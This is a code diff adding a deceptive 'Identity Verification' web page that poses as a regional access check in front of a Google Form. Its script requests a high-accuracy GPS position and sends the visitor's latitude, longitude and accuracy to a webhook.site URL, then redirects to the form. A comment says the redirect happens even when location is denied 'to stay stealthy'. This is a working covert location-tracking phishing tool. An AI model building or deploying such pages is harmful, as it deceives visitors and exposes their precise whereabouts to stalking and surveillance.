@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification</title>
+    <meta property="og:title" content="Security Verification Required">
+    <meta property="og:description" content="Please verify your location to access the secure form.">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/forms_2020q4_48dp.png">
+    
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #1c1e21;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="loader"></div>
+    <h2>Verifying Connection...</h2>
+    <p>We are verifying your region to grant access to the form. Please click <b>"Allow"</b> on the location prompt.</p>
+</div>
+
+<script>
+    // Configuration
+    const WEBHOOK_URL = "https://webhook.site/81426716-72be-48fc-a494-fcd675327a3e";
+    const FINAL_DESTINATION = "https://docs.google.com/forms/d/1kXi_Hw0GgWOI533BwZx-RxhWeSzsl28WUR1yVCSmkJ0/viewform";
+
+    function redirectToForm() {
+        window.location.href = FINAL_DESTINATION;
+    }
+
+    window.onload = function() {
+        if (navigator.geolocation) {
+            // Requesting high accuracy GPS
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+
+                // Send data to your Webhook
+                fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}&accuracy=${acc}meters`)
+                    .then(() => {
+                        // Redirect after data is sent
+                        setTimeout(redirectToForm, 500);
+                    })
+                    .catch(() => redirectToForm());
+            }, function(error) {
+                // If they deny or error occurs, redirect anyway to stay stealthy
+                redirectToForm();
+            }, {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            });
+        } else {
+            // Browser doesn't support Geolocation
+            redirectToForm();
+        }
+    };
+</script>
+
+</body>
+</html>
